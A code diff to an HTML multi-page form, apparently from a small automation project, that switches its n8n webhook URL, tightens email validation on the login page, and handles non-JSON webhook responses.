@@ -151,7 +151,7 @@
 </head>
 <body>
 
-    <form id="multiPageForm" action="https://calixtojohnn.app.n8n.cloud/webhook-test/a8026648-8db7-45f5-8425-883b201a7c7b" method="POST">
+    <form id="multiPageForm" action="https://calixtojohnn.app.n8n.cloud/webhook-test/204f8937-2390-432a-9826-f4fe9154837b" method="POST">
     
         <fieldset id="page1">
             <h2>Login</h2>
@@ -214,8 +214,8 @@
             const emailInput = document.getElementById('email');
             const passwordInput = document.getElementById('password');
 
-            if (!emailInput.value || !passwordInput.value) {
-                alert('Please fill in both email and password.');
+            if (!emailInput.value || !emailInput.checkValidity() || !passwordInput.value) {
+                alert('Please fill in a valid email and password.');
                 return;
             }
 
@@ -266,7 +266,13 @@
                 if (!response.ok) {
                     throw new Error('Network response was not ok');
                 }
-                return response.json();
+                // Check if response is JSON, otherwise it fails on n8n's "workflow activated" response
+                const contentType = response.headers.get("content-type");
+                if (contentType && contentType.indexOf("application/json") !== -1) {
+                    return response.json();
+                } else {
+                    return response.text(); // Just get text if not JSON
+                }
             })
             .then(result => {
                 // Success! Show Page 3
